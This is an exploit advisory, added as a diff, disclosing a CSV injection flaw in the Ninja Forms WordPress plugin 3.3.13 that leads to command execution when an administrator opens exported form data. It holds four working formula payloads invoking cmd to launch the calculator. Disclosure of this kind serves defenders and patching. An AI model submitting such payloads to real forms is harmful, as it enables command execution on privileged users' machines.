@@ -1,0 +1,33 @@
+# Exploit Title: Wordpress Plugin Ninja Forms 3.3.13 - CSV Injection
+# Exploit Author: Mostafa Gharzi
+# Website: https://www.certcc.ir
+# Date: 2018-08-19
+# Google Dork: N/A
+# Vendor: The WP Ninjas
+# Software Link: https://wordpress.org/plugins/ninja-forms/
+# Affected Version: 3.3.13 and before
+# Active installations: 1+ million
+# Patched Version: unpatched
+# Category: Web Application
+# Platform: PHP
+# Tested on: Win10x64 & Kali Linux
+
+# 1. Technical Description:
+# WordPress Ninja Forms plugin version 3.3.13 and before are affected by Remote Code Execution
+# through the CSV injection vulnerability. This allows an application user
+# to inject commands as part of the fields of forms and these commands are executed when a user with
+# greater privilege exports the data in CSV and opens that file on his machine.
+
+# 2. Proof Of Concept (PoC):
+# Enter the payload =SUM(1+1)*cmd|' /C calc'!A0 in any field of the form,
+# for example, in name field.
+# When the user with high privileges logs in to the application, export
+# data in CSV and opens the
+# generated file, the command is executed and the calculator will run open
+# on the machine.
+
+# 3. Payloads:
+=SUM(1+1)*cmd|' /C calc'!A0
++SUM(1+1)*cmd|' /C calc'!A0
+-SUM(1+1)*cmd|' /C calc'!A0
+@SUM(1+1)*cmd|' /C calc'!A0
